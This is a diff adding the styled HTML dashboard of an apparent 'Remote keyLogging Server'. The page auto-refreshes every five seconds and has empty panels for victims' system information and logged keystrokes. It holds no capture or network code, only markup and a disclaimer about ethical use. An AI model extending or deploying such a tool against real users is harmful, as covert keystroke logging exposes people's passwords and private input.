@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="refresh" content='5'>
+    <title>keyLogger</title>
+    <style>
+        html, body {
+            height: 100%;
+            margin: 0;
+        }
+        .wrapper {
+            min-height: 100%;           
+            display: flex;
+            flex-direction: column;     
+        }
+
+        .content {
+            flex: 1;                    
+            padding: 20px;              
+        }
+        #heading{
+            border: 3px solid rgb(23, 190, 95);  
+            padding: 20px;               
+            margin: 20px;                
+            color:#08ef59;             
+            font-size: 36px;             
+            text-align: center;
+            text-shadow: 5px;
+        }
+        #sys{
+            border: 3px solid rgb(23, 190, 95); 
+            margin: 10px;
+            margin-top: 70px;
+            padding: 10px;               
+            width: fit-content;       
+            color:#ff0000;             
+            font-size: 20px;
+            text-shadow: 5px;
+            
+        }
+        #data{
+            border: 3px solid rgb(23, 190, 95); 
+            margin: 10px;
+            margin-top: 50px;
+            padding: 10px;               
+            width: fit-content;       
+            color:#ff0000;             
+            font-size: 20px;
+            text-shadow: 5px;
+        }
+        #info{
+            border: 3px solid rgb(23, 190, 95); 
+            margin: 10px;
+            padding: 10px;                      
+            color:#00ffdd;             
+            font-size: 20px;
+            text-shadow: 5px;
+        }
+        #val{
+            border: 3px solid rgb(23, 190, 95); 
+            margin: 10px;
+            padding: 10px;                      
+            color:#ffffff;             
+            font-size: 20px;
+            text-shadow: 5px;
+        }
+        #note{
+            color: #00ff15;
+            font-size: 20px;
+            text-align: center;
+        }
+    </style>
+</head>
+
+<body style="font-family:monospace;background-color: #292825;">
+    <div id = "main">
+        <h1 id="heading">---Remote keyLogging Server---</h1>
+        
+        <h3 id="sys">--System Information</h3>
+       
+        <p id = "info" >-/-
+        </p>
+        
+        <h3 id="data">--Logged key Strokes</h3>
+       
+        <p id="val">--/</p>
+
+        <p  id = note style="margin-top:22%;">
+            Use it only for Ethical purpose :D<br>
+            &lt;Nothing2Infinity&gt;
+        </p>
+        
+    </div>
+</body>
+</html>
